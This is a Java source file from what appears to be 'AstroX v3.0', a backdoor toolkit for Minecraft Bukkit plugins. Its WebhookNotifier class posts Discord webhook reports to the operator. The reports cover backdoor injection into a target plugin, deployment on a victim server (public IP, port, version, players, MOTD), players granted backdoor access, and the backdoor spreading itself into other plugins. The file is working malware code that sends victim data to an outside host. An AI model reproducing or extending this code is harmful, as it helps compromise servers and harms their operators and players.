package dev.naruto.astrox.utils;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.Instant;

/**
 * Discord webhook notifier for injection and deployment events
 */
public class WebhookNotifier {
    private final String webhookUrl;

    public WebhookNotifier(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    /**
     * Send injection success notification (build-time)
     */
    public void sendInjectionSuccess(String pluginName, String version,
                                     String mainClass, long fileSize, String prefix) throws Exception {
        String json = buildSuccessEmbed(pluginName, version, mainClass, fileSize, prefix);
        sendWebhook(json);
    }

    /**
     * Send server deployment notification (runtime)
     */
    public void sendServerDeployment(String pluginName, String serverVersion,
                                     int onlinePlayers, int maxPlayers, String prefix) throws Exception {
        String json = buildDeploymentEmbed(pluginName, serverVersion, onlinePlayers, maxPlayers, prefix);
        sendWebhook(json);
    }

    /**
     * Send authentication notification (when someone auths)
     */
    public void sendAuthNotification(String playerName, String playerUUID, String serverIP) throws Exception {
        String json = buildAuthEmbed(playerName, playerUUID, serverIP);
        sendWebhook(json);
    }

    /**
     * Build injection success embed
     */
    private String buildSuccessEmbed(String pluginName, String version,
                                     String mainClass, long fileSize, String prefix) {
        String timestamp = Instant.now().toString();
        String hostname = getHostname();
        String localIP = getLocalIP();
        long fileSizeKB = fileSize / 1024;

        return String.format("""
            {
              "embeds": [{
                "title": "🎯 AstroX Injection Successful",
                "description": "Backdoor successfully injected into target plugin",
                "color": 65280,
                "fields": [
                  {
                    "name": "📦 Target Plugin",
                    "value": "`%s` v%s",
                    "inline": true
                  },
                  {
                    "name": "⚡ Command Prefix",
                    "value": "`%s`",
                    "inline": true
                  },
                  {
                    "name": "📁 File Size",
                    "value": "%d KB",
                    "inline": true
                  },
                  {
                    "name": "🔧 Main Class",
                    "value": "`%s`",
                    "inline": false
                  },
                  {
                    "name": "💻 Build Machine",
                    "value": "**Hostname:** `%s`\\n**Local IP:** `%s`",
                    "inline": false
                  }
                ],
                "footer": {
                  "text": "AstroX v3.0 • Injection Phase"
                },
                "timestamp": "%s"
              }]
            }
            """, pluginName, version, prefix, fileSizeKB, mainClass, hostname, localIP, timestamp);
    }

    /**
     * Build server deployment embed (RUNTIME NOTIFICATION)
     */
    private String buildDeploymentEmbed(String pluginName, String serverVersion,
                                        int onlinePlayers, int maxPlayers, String prefix) {
        String timestamp = Instant.now().toString();
        String serverIP = getPublicIP();
        String serverPort = String.valueOf(Bukkit.getPort());
        String motd = Bukkit.getMotd();

        return String.format("""
            {
              "embeds": [{
                "title": "🚀 Backdoor Deployed on Server",
                "description": "**Target server is now under control!**",
                "color": 16711680,
                "fields": [
                  {
                    "name": "🌐 Server IP",
                    "value": "`%s:%s`",
                    "inline": true
                  },
                  {
                    "name": "🎮 Server Version",
                    "value": "`%s`",
                    "inline": true
                  },
                  {
                    "name": "👥 Players Online",
                    "value": "`%d/%d`",
                    "inline": true
                  },
                  {
                    "name": "📦 Plugin",
                    "value": "`%s`",
                    "inline": true
                  },
                  {
                    "name": "⚡ Command Prefix",
                    "value": "`%s`",
                    "inline": true
                  },
                  {
                    "name": "📊 Status",
                    "value": "✅ **Active & Ready**",
                    "inline": true
                  },
                  {
                    "name": "📝 Server MOTD",
                    "value": "%s",
                    "inline": false
                  }
                ],
                "footer": {
                  "text": "AstroX v3.0 • Runtime Deployment"
                },
                "timestamp": "%s"
              }]
            }
            """, serverIP, serverPort, serverVersion, onlinePlayers, maxPlayers,
                pluginName, prefix, escapeMOTD(motd), timestamp);
    }

    /**
     * Build authentication notification embed
     */
    private String buildAuthEmbed(String playerName, String playerUUID, String serverIP) {
        String timestamp = Instant.now().toString();

        return String.format("""
            {
              "embeds": [{
                "title": "🔑 New User Authenticated",
                "description": "A player has gained backdoor access",
                "color": 16776960,
                "fields": [
                  {
                    "name": "👤 Player",
                    "value": "`%s`",
                    "inline": true
                  },
                  {
                    "name": "🆔 UUID",
                    "value": "`%s`",
                    "inline": false
                  },
                  {
                    "name": "🌐 Server",
                    "value": "`%s`",
                    "inline": true
                  }
                ],
                "footer": {
                  "text": "AstroX v3.0 • Authentication Event"
                },
                "timestamp": "%s"
              }]
            }
            """, playerName, playerUUID, serverIP, timestamp);
    }

    /**
     * Send webhook POST request
     */
    private void sendWebhook(String json) throws Exception {
        URL url = new URL(webhookUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", "AstroX/3.0");
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        int responseCode = conn.getResponseCode();
        if (responseCode < 200 || responseCode >= 300) {
            throw new Exception("Webhook returned " + responseCode);
        }
    }

    private String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private String getLocalIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "Unknown";
        }
    }

    /**
     * Get public IP of the server
     */
    private String getPublicIP() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);

            if (conn.getResponseCode() == 200) {
                byte[] response = conn.getInputStream().readAllBytes();
                return new String(response, StandardCharsets.UTF_8);
            }
        } catch (Exception ignored) {}

        // Fallback to local IP
        return getLocalIP();
    }

    private String escapeMOTD(String motd) {
        if (motd == null || motd.isEmpty()) return "No MOTD";
        // Strip Minecraft color codes and escape JSON
        return motd.replaceAll("§[0-9a-fk-or]", "")
                .replaceAll("\"", "\\\\\"")
                .substring(0, Math.min(motd.length(), 100));
    }

    /**
     * Send user-added notification
     */
    public void sendUserAddedNotification(String addedBy, String targetName, String targetUUID) throws Exception {
        String json = buildUserAddedEmbed(addedBy, targetName, targetUUID);
        sendWebhook(json);
    }

    /**
     * Build user-added embed
     */
    private String buildUserAddedEmbed(String addedBy, String targetName, String targetUUID) {
        String timestamp = Instant.now().toString();
        String serverIP = Bukkit.getIp() + ":" + Bukkit.getPort();

        return String.format("""
        {
          "embeds": [{
            "title": "👥 New User Authorized",
            "description": "A new user has been granted backdoor access",
            "color": 3447003,
            "fields": [
              {
                "name": "🆕 New User",
                "value": "`%s`",
                "inline": true
              },
              {
                "name": "👤 Added By",
                "value": "`%s`",
                "inline": true
              },
              {
                "name": "🆔 UUID",
                "value": "`%s`",
                "inline": false
              },
              {
                "name": "🌐 Server",
                "value": "`%s`",
                "inline": true
              }
            ],
            "footer": {
              "text": "AstroX v3.0 • User Management"
            },
            "timestamp": "%s"
          }]
        }
        """, targetName, addedBy, targetUUID, serverIP, timestamp);
    }

    /**
     * Send propagation notification
     */
    public void sendPropagationNotification(String pluginName, String version, String filename) throws Exception {
        String json = buildPropagationEmbed(pluginName, version, filename);
        sendWebhook(json);
    }

    /**
     * Build propagation embed
     */
    private String buildPropagationEmbed(String pluginName, String version, String filename) {
        String timestamp = Instant.now().toString();
        String serverIP = Bukkit.getIp() + ":" + Bukkit.getPort();

        return String.format("""
        {
          "embeds": [{
            "title": "🦠 Backdoor Self-Replicated",
            "description": "**Automatically spread to new plugin!**",
            "color": 16711935,
            "fields": [
              {
                "name": "📦 Infected Plugin",
                "value": "`%s` v%s",
                "inline": true
              },
              {
                "name": "📁 Filename",
                "value": "`%s`",
                "inline": true
              },
              {
                "name": "🌐 Server",
                "value": "`%s`",
                "inline": true
              },
              {
                "name": "🦠 Status",
                "value": "✅ **Auto-Propagated**",
                "inline": false
              }
            ],
            "footer": {
              "text": "AstroX v3.0 • Self-Replication Engine"
            },
            "timestamp": "%s"
          }]
        }
        """, pluginName, version, filename, serverIP, timestamp);
    }

}
